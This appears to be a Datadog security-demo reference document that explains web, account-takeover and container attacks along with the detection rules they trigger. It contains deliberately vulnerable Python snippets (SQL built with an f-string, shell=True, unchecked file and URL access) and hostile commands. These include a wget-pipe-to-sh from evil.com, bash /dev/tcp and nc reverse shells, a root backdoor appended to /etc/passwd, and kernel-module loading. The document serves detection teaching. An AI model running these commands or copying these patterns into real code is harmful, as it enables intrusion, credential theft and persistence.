# Attacks Explained — Demo Reference

A per-attack technical brief for the demo environment. For each: what the attack is, how the exploit works, why the code is vulnerable, what Datadog sees, and the precise rule that fires.

Use this alongside [DEMO_FLOW.md](DEMO_FLOW.md) — that doc is the runbook, this one is the "I just got asked how SQL injection actually works in front of a customer" cheat sheet.

---

## Part 1 — AAP / Web Application attacks (single-trace rules)

These rules evaluate **on each request**. Latency from attack → signal is ~30-60s. No volume needed. Great for live demos.

### 1.1 SQL Injection (SQLi)

**Endpoint:** `GET /vuln/sqli?breed=...`
**Rule:** `SQL injection exploited` — critical
**MITRE:** T1190 (Exploit Public-Facing Application), OWASP A03:2021 (Injection)

**What it does**
Tricks the database into running attacker-controlled SQL by injecting query fragments into a string-interpolated query. `' OR '1'='1` turns a `WHERE breed = '<input>'` lookup into a "return everything" — leaking the whole table. More dangerous variants drop tables, exfiltrate columns via `UNION SELECT`, or pivot via stacked queries.

**Why the code is vulnerable** ([app.py:vuln_sqli](../app.py))
```python
cur.execute(f"SELECT id, breed, description FROM dogs WHERE breed = '{breed}'")
```
The breed value flows from `request.args` directly into an f-string. The DB-API has a safe parameterized form (`cur.execute("... WHERE breed = %s", (breed,))`) which would have prevented this entirely — the driver escapes the value as data, not code.

**How Datadog detects it**
- ddtrace's **IAST taint-tracking** marks data from `request.args` as tainted.
- When that tainted value reaches a SQL sink (`psycopg2.cursor.execute`), AAP raises an exploit signal.
- The detection is **not** regex on the raw URL — it's a code-level data-flow analysis happening inside the Python process.
- This is the differentiator vs a traditional WAF: encoding bypasses (URL-encoding the quote, `CHAR(39)`, comment tricks) don't matter because AAP sees the **decoded** string at the SQL boundary.

**What to point at in the UI**
- Signal panel → **Vulnerable Code** tab: highlights the exact `f"SELECT ... '{breed}'"` line in app.py
- **Tainted source/sink chain**: `request.args['breed']` → `cur.execute(...)`
- **Linked APM trace**: shows the actual SQL the database received

---

### 1.2 Local File Inclusion (LFI) / Path Traversal

**Endpoint:** `GET /vuln/lfi?file=/etc/passwd`
**Rule:** `Local file inclusion exploited` — critical
**MITRE:** T1083 (File and Directory Discovery)

**What it does**
Reads arbitrary files from the container's filesystem by passing an absolute path or `../../../etc/passwd`-style traversal. Real-world impact: read application secrets (`/proc/self/environ`, `.env`), AWS credentials (`~/.aws/credentials`), kubelet tokens (`/var/run/secrets/kubernetes.io/serviceaccount/token`), or chain into RCE if the file is later evaluated (PHP includes, Python pickle on a writable path).

**Why the code is vulnerable** ([app.py:vuln_lfi](../app.py))
```python
path = request.args.get('file', '')
with open(path, 'r') as f:
    return f.read()
```
No allowlist, no normalization. `open` happily reads any file the process has permission to read. Worse: combine with the IRSA token mount → the attacker gets the SA token → access to S3.

**How Datadog detects it**
- IAST taints `request.args['file']` and watches Python file I/O sinks (`open`, `pathlib.Path.read_text`, etc.).
- When a tainted path reaches `open()`, AAP raises the signal.
- The rule also looks at the actual path — paths matching `/etc/passwd`, `/etc/shadow`, `/proc/self/environ`, etc. fire with higher confidence.

**What to point at in the UI**
- Signal → **Response body** preview shows the actual exfiltrated `/etc/passwd` contents
- **Threat intel tab**: source IP `195.68.82.26` flagged as residential proxy
- Note that the same span carries the APM trace — you can see the Flask handler executing the read

---

### 1.3 Command Injection

**Endpoint:** `GET /vuln/cmd?cmd=id`
**Rule:** `Command injection exploited` — critical
**MITRE:** T1059 (Command and Scripting Interpreter)

**What it does**
Runs attacker-controlled shell commands on the container. `id` is benign, `wget http://evil.com/x.sh | sh` is RCE. From an EKS pod with IRSA, this means the attacker can `aws s3 ls` your buckets, list pods (`kubectl` via service account), etc.

**Why the code is vulnerable** ([app.py:vuln_cmd](../app.py))
```python
subprocess.run(cmd, shell=True, ...)
```
`shell=True` invokes `/bin/sh -c "<cmd>"`. The shell parses metacharacters: `;`, `&&`, `|`, `$(...)`, backticks. Even if you tried to escape the input, the shell layer reinterprets it.

**How Datadog detects it**
- IAST tracks `request.args['cmd']` flowing into `subprocess.run`, `os.system`, `os.popen`, etc.
- **CWS also sees this at the syscall level** — the same attack triggers TWO signals (one AAP, one CWS) which is the "cross-product correlation" pitch in the demo.

**What to point at in the UI**
- AAP signal: shows the HTTP request, the command argument, the IAST taint path
- Pivot to CWS: same attack also fires "Suspicious shell in container" (the host saw `python → sh → id`)
- This is the demo moment where you put two browser tabs side by side: AAP (left, request-side view) and CWS (right, syscall-side view)

---

### 1.4 Server-Side Request Forgery (SSRF)

**Endpoint:** `GET /vuln/ssrf?url=http://169.254.169.254/...`
**Rule:** `Server-Side Request Forgery attempt` — high/critical depending on target
**MITRE:** T1190, OWASP A10:2021

**What it does**
The server fetches a URL on the attacker's behalf. The classic high-impact target is **AWS IMDS** at `169.254.169.254` — that returns IAM credentials of the host/pod. From there: pivot to S3, RDS, secrets manager.

The reason SSRF is so devastating in cloud is that internal-network endpoints (IMDS, internal load balancers, internal databases, neighbor pods) are typically unauthenticated, but firewalled from the public internet — they trust requests because they "come from inside the perimeter." An SSRF gives the attacker exactly that vantage.

**Why the code is vulnerable** ([app.py:vuln_ssrf](../app.py))
```python
url = request.args.get('url', '')
with urllib.request.urlopen(url, timeout=5) as resp:
    ...
```
No allowlist of hostnames. No private-IP filter. No DNS rebinding protection. Even with a hostname check, attackers can use TOCTOU DNS tricks to bypass.

**How Datadog detects it**
- AAP inspects `urllib.urlopen` / `requests.get` arguments derived from request input.
- Rule looks at the destination: IMDS endpoints, RFC1918 ranges, link-local (`169.254.0.0/16`), localhost — anything in the "should never be reachable from a web request" set fires.

**What to point at in the UI**
- Signal shows the URL attempted and the response body preview (you literally see the IMDS metadata that leaked)
- If the pod has IMDSv2 enforced, the attack returns 401 — show the signal still fires (it's about the ATTEMPT, not success). This is a great talking point: "ASM caught the attempt even though our defense-in-depth blocked it. Without this you'd never know someone was probing."

---

## Part 2 — AAP / Account Takeover (aggregation rules)

These rules count events over a window (5 min - 1 hour) and fire when thresholds cross. Need volume. Pre-warm for live demo.

### 2.1 Brute Force on a single user

**Endpoint:** `POST /auth/login` (40+ times same user, different passwords)
**Rule ID:** `def-000-0f4` — "Bruteforce attack"
**MITRE:** T1110.001 (Password Guessing), OWASP A07:2021 (Identification & Authentication Failures)

**What it does**
Repeatedly tries passwords against one known account until the right one hits. Effective against:
- Accounts with weak/common passwords
- Apps without rate-limiting or lockout
- Apps where the failure response leaks "user exists vs doesn't" (timing-based or response-shape)

**Why the code is vulnerable** ([app.py:auth_login](../app.py))
```python
DEMO_USERS = {'admin': 'admin123', 'lahoucine': 'password', 'demo': 'demo'}
SESSIONS = {}   # in-memory, in-process

if expected and secrets.compare_digest(expected, password):
    ...success...
else:
    ...401 fail...
```
- Weak passwords in plaintext (not even hashed)
- No rate limit
- No CAPTCHA after N failures
- No account lockout
- In-memory session store survives only this pod's lifetime

`secrets.compare_digest` is the one thing done right — it prevents timing-based username enumeration.

**How Datadog detects it**
The ddtrace `track_user_login_failure_event` / `_success_event` SDK calls produce structured AppSec events on the trace. The Bruteforce rule queries spans tagged `@appsec.security_activity:business_logic.users.login.failure` and aggregates by `(env, service, @appsec.events_data.usr.login)`.

Conditions (any one true):
| Sub-rule | Threshold |
|---|---|
| Real-user failures + distributed | `failed_login_of_real_user > 20 AND ip_count > 5` |
| High volume from one IP | `failed_login_of_real_user > 40` |
| From threat-intel-flagged IP | `failed_login_of_user_from_ti > 20` |

Plus for the **critical** "Account compromised" variant:
- `successful_login > 0` (the attacker eventually got in)
- `10 × successful_login < failed_login_of_user` (the failure-to-success ratio is suspicious, not just a fat-fingered user)

**What to point at in the UI**
- Signal title literally says "Account compromised by bruteforce attack" when the chain matches
- The "Sessions" panel shows the RUM session IDs of every browser attempt — click into the replay to **watch the attacker typing wrong passwords** (this is the showstopper moment from the Selenium demo)
- The "users" tab: see who got compromised and what they did after

---

### 2.2 Credential Stuffing

**Endpoint:** `POST /auth/login` (100+ times across many distinct users from one IP)
**Rule ID:** `def-000-yk4` — "Credential Stuffing attack"
**MITRE:** T1110.004 (Credential Stuffing)

**What it does**
Attacker has a list of `(email, password)` pairs leaked from some other breach. They replay all of them against YOUR app, hoping users reused passwords. This is the dominant ATO attack vector in practice — bigger volume than brute-force, lower per-account hit rate.

**Why it's harder to detect than brute force**
- Each user gets attacked only 1-2 times → no per-user threshold trips
- IPs may be distributed via residential proxies → no per-IP threshold trips
- Each request looks like a totally plausible login

**How Datadog detects it**
The Credential Stuffing rule groups by `(env, service, @http.client_ip)` and counts failures across DIFFERENT usernames from the same IP.

Conditions (any one true):
| Sub-rule | Threshold |
|---|---|
| Failures from one IP across many users | `failed_login_by_ip > 30 AND user_count >= 5` |
| Failures from one IP, threat-intel flagged | `failed_login_by_ip_with_ti > 15 AND user_count >= 5` |
| Failures with no user ID | `failed_login_by_ip_without_usrid >= 10` |

Plus for the critical variant: `successful_login_by_the_ip > 0` (the attacker landed at least one valid credential).

**Distributed Credential Stuffing** (`def-000-5q2`, `def-000-azr`, `def-000-1ij`) — when the attack comes from many IPs at once. Datadog fingerprints the attacker beyond just IP (browser fingerprint, user-agent, etc.) — three variants of this rule fire based on attacker-fingerprint, attempt count, and user count.

---

### 2.3 Account Takeover (ATO)

ATO is not a single rule — it's the **critical case** inside Bruteforce / Credential Stuffing rules:

> Many failed logins + at least one successful login on a normally-failing account = the attacker found the password.

The signal title in those cases is literally "Account compromised by [bruteforce|credential stuffing]". When demoing, this is the moment to land on — it's the answer to "what's actually different about ASM vs a WAF": *the WAF only sees failed attempts; ASM sees the success that means an account was just taken over.*

---

## Part 3 — Cloud Workload Security (CWS)

CWS observes **syscalls** via eBPF in the kernel. The Datadog security-agent container runs on every node and matches process/file/network activity against rules. Detection latency: ~10-30s. No instrumentation in the application — works for ANY workload on the node (yours, third-party images, attacker-introduced binaries).

### 3.1 LD_PRELOAD / Dynamic Linker Hijacking

**Endpoint:** `GET /vuln/cws/ld-preload`
**Rule:** `ld_preload_unusual_library_path` — medium
**MITRE:** T1574.006

**What it does**
`LD_PRELOAD` is a Linux environment variable that tells the dynamic linker (`ld.so`) to load a shared library BEFORE any other library, including libc. Functions in the preload library override system functions — letting an attacker hide their own processes from `ps`, hide their files from `ls`, intercept network calls before they hit the wire, etc. It's a classic rootkit technique.

**Why the demo triggers it**
```python
subprocess.run(['/bin/sh', '-c', 'LD_PRELOAD=/tmp/evil.so id'], ...)
```
We don't actually have `/tmp/evil.so` so the command fails. But CWS sees the **attempt** at the syscall layer — specifically `execve` with `LD_PRELOAD` pointing at `/tmp/*` (a user-writable path) — and fires regardless.

**Detection signature**
The eBPF rule probably looks like (approximation):
```
exec.envp contains "LD_PRELOAD=/tmp/"
OR exec.envp contains "LD_PRELOAD=/dev/shm/"
OR exec.envp contains "LD_PRELOAD=/var/tmp/"
```

**What to point at in the UI**
- Process tree: `python app.py` → `sh -c LD_PRELOAD=...` → `id`
- The `LD_PRELOAD` value: `/tmp/evil.so` — clearly suspicious
- This was the FIRST CWS signal that fired in our env — confirms eBPF is healthy

---

### 3.2 Sensitive File Modification (/etc/passwd)

**Endpoint:** `GET /vuln/cws/passwd-write`
**Rule:** `Modification of /etc/passwd` (or similar sensitive-file rule) — medium/high

**What it does**
Appends a new user line to `/etc/passwd`. In real attacks, this is post-exploitation **persistence** — the attacker adds a backdoor account with UID 0 (`hacker:x:0:0::/root:/bin/sh`) so they can re-enter even after the initial exploit is patched.

**Why the demo triggers it**
```python
subprocess.run('echo "hacker:x:0:0::/root:/bin/sh" >> /etc/passwd', shell=True)
```
The container's `/etc/passwd` is writable by root, and the Flask process IS root in the container (most demo apps are). So the write succeeds.

**Detection signature**
- `open` / `openat` / `write` syscall with target `/etc/passwd` AND mode includes O_WRONLY/O_APPEND
- Or `rename`/`link`/`symlink` involving `/etc/passwd`

**Sub-rule:** Datadog has a category of "Sensitive file access" rules that cover `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, SSH authorized_keys, AWS credential files, k8s service account tokens.

**What to point at in the UI**
- Full process tree showing `subprocess.run → sh → echo`
- The argument to echo (the new user line) is captured
- File path: `/etc/passwd`, operation: `write/append`

---

### 3.3 Container Recon / Discovery

**Endpoint:** `GET /vuln/cws/discovery`
**Rule:** Container discovery / `T1057-process-discovery` family

**What it does**
Once an attacker has code execution, the first thing they do is figure out where they are: `whoami`, `id`, `uname -a`, `hostname`, `cat /etc/shadow`, `ip a`, `netstat`. This phase is called **discovery** in MITRE ATT&CK.

**Why the demo triggers it**
```python
subprocess.run('whoami; id; hostname; uname -a; cat /etc/shadow; ip a; netstat -an', shell=True)
```
Chaining many recon commands in one shell invocation.

**Detection signature**
A composite rule looking for sequences of known discovery binaries (`whoami`, `id`, `uname`, `netstat`, `ifconfig`, `cat /etc/passwd`, `cat /etc/shadow`) executed by the same process tree within a short window. Single `whoami` is fine; ten of them chained is not.

---

### 3.4 Crypto-miner Pattern

**Endpoint:** `GET /vuln/cws/crypto-miner`
**Rule:** Crypto-miner process detection — high

**What it does**
Detects processes whose **name** or **argv[0]** matches known crypto-mining binaries (`xmrig`, `xmr-stak`, `kdevtmpfsi`, `kinsing`, etc.). These are the most common payloads dropped by container exploiters once they have RCE — the attacker is monetizing your compute.

**Why the demo triggers it**
```python
subprocess.Popen(['/bin/sh', '-c', 'exec -a xmrig sleep 30'])
```
The `exec -a NAME` shell builtin renames the process. We're actually just running `sleep 30` but the kernel sees it under the name `xmrig`. CWS matches on the name, not the binary contents.

**Detection signature**
Process exec where `process.comm` or `process.argv[0]` matches a regex against a list of known miner names. The list is maintained by Datadog and updated when new miners are observed in the wild.

---

### 3.5 Reverse Shell

**Endpoint:** `GET /vuln/cws/reverse-shell?host=10.0.0.99&port=4444`
**Rule:** Reverse shell detection — high/critical

**What it does**
Opens a TCP connection from the victim out to the attacker, redirects stdin/stdout/stderr of a shell to that socket. Now the attacker has an interactive shell inside your container, bypassing all inbound firewalls (the connection is outbound, which most firewalls allow).

**Why the demo triggers it**
```bash
sh -i 5<> /dev/tcp/<host>/<port> 0<&5 1>&5 2>&5
```
This is a classic bash reverse-shell one-liner. `/dev/tcp/HOST/PORT` is bash's special path that creates a TCP socket. `0<&5 1>&5 2>&5` redirects stdin/stdout/stderr through it.

**Detection signature**
A process opens a socket via `connect()`, then calls `dup2()` to wire fds 0/1/2 to that socket, then calls `execve("sh"|"bash")`. The sequence is the fingerprint. Variants:
- `python -c 'import socket,os,pty; ...'`
- `nc -e /bin/sh attacker.com 4444`
- `perl -e 'use Socket; ...'`

CWS fires regardless of the implementation language because the underlying syscall sequence is identical.

**What to point at**
- Network destination: `10.0.0.99:4444` (private RFC1918 — the attacker is inside the VPC, possibly via another compromised pod)
- File descriptor manipulation visible in the trace

---

### 3.6 Kernel Module Manipulation

**Endpoint:** `GET /vuln/cws/kernel-module`
**Rule:** Kernel module rule — high

**What it does**
Loading a kernel module is the ultimate persistence — kernel-mode code can hide itself from any user-space tool. Real attackers occasionally try this on misconfigured containers running with `--privileged` or `CAP_SYS_MODULE`.

**Why the demo triggers it**
```bash
lsmod; insmod /tmp/evil.ko 2>&1; modprobe evil 2>&1
```
All three commands attempt to interact with the kernel module subsystem. The `insmod/modprobe` calls FAIL (we don't have the capability), but the attempt is logged.

---

## Part 4 — APM Error Tracking (not security but in the demo)

These aren't security signals — they're regular APM error events that show up in **APM → Error Tracking**.

### 4.1 Divide by Zero / Unhandled Exception

**Endpoint:** `GET /vuln/crash/divide-by-zero`, `/vuln/crash/exception`
**What:** `ZeroDivisionError`, `RuntimeError`
**Datadog:** ddtrace auto-captures unhandled exceptions, groups by exception type + stack trace, deduplicates into "Error Tracking issues". Great for demoing the difference between **a span with status=error** (one occurrence) and **an Error Tracking issue** (the deduplicated, alertable, assignable artifact).

### 4.2 OOM

**Endpoint:** `/vuln/crash/oom` (caution — kills the pod)
**What:** Allocates unbounded memory in a Python list until the container's memory limit is hit. Kubernetes sends SIGKILL, pod restarts.
**Datadog:** No span (process died mid-request — span never closes). But:
- Infrastructure → Containers shows the OOMKill event
- Live Container metric `kubernetes.containers.last_state.terminated.exit_code:137` spikes
- The Deployment generates a "container restarted with reason: OOMKilled" event

### 4.3 Slow Request

**Endpoint:** `/vuln/crash/slow?seconds=5`
**What:** `time.sleep(N)` blocking the request thread
**Datadog:** APM trace duration metric spikes. P95 latency dashboard widget reacts. If you have an SLO on this endpoint, the SLO error budget burns visibly.

### 4.4 CPU Burn

**Endpoint:** `/vuln/crash/cpu`
**What:** Tight Python loop for 10 seconds
**Datadog:** **Continuous Profiler** (if enabled — adds DD_PROFILING_ENABLED=true) shows the CPU flame graph with the burn loop at 100% sample weight. Otherwise just shows in container CPU metrics.

---

## How to read the Datadog UI for any of these

1. **Security → AAP / CWS → Signals** — start here
2. Click a signal → side panel opens with:
   - **Overview** — title, severity, environment, service, time
   - **Request** (AAP) or **Process tree** (CWS) — the actual evidence
   - **Threat intel** — IP enrichment (geo, ASN, threat-intel category)
   - **Trace** (AAP) — link to the APM trace this signal came from
   - **Sessions** (AAP) — RUM sessions associated with the attack
   - **Code** (AAP, when IAST has data) — the vulnerable line in your source
   - **Triage** — assign, archive, suppress, escalate to Case Management
3. Pivot from any signal → APM trace → logs → infra metrics: same `trace_id` / `host` connect everything.

The single skill to teach the audience: **every signal links to its trace, every trace links to its host, every host links to its signals**. Pick any starting point and you can reach the others in one click. That's the "single pane of glass" pitch — backed up by real linked data, not a marketing slide.
